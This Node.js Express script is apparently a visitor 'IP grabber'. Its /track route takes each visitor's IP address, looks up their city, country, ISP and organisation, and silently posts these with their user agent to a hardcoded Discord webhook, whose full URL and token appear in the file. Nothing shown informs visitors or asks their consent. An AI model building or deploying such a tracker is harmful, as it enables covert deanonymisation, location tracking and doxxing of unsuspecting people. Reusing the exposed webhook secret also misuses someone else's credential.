import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";

app.set("trust proxy", true);

// Home
app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// Track
app.get("/track", async (req, res) => {

    // Get visitor IP
    let ip =
        req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
        req.socket.remoteAddress ||
        "Unknown";

    // Remove IPv4-mapped IPv6 prefix
    ip = ip.replace(/^::ffff:/, "");

    const userAgent = req.headers["user-agent"] || "Unknown";

    let city = "Unknown";
    let country = "Unknown";
    let isp = "Unknown";
    let org = "Unknown";
    let ipType = "Unknown";

    try {
        const geoRes = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`);
        const data = await geoRes.json();

        if (data.success) {
            city = data.city || "Unknown";
            country = data.country || "Unknown";
            isp = data.connection?.isp || "Unknown";
            org = data.connection?.org || "Unknown";
            ipType = data.type || "Unknown";
        }
    } catch (err) {
        console.error("Geo lookup failed:", err);
    }

    const message = `
🇵🇭 New Visitor Logged

🌍 IP: ${ip}
📶 Type: ${ipType}

📍 Location: ${city}, ${country}
🏢 ISP: ${isp}
🏢 Org: ${org}

🖥️ Device: ${userAgent}
`;

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: message
            })
        });
    } catch (err) {
        console.error("Webhook failed:", err);
    }

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
